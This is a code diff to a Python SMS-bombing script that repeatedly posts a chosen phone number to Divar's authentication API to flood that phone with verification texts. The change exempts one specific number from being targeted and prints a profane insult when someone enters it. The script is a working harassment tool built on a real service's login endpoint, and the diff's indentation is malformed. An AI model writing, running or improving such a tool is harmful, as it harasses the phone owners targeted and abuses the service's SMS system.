@@ -8,7 +8,8 @@ NUmb = int(input("Number of sms : "))
 
 Api = {"phone":esfelurm}
 
-for i in range(int(NUmb)):
+if esfelurm != "09024986422":
+    for i in range(int(NUmb)):
     try:
         api = post ('https://api.divar.ir/v5/auth/authenticate', json=Api)
         print (f" Sent")
@@ -254,3 +255,5 @@ for i in range(int(NUmb)):
         print (f" Sent")
     except:
         print (f" No sent")
+else:
+    print("fuck you bach!!")
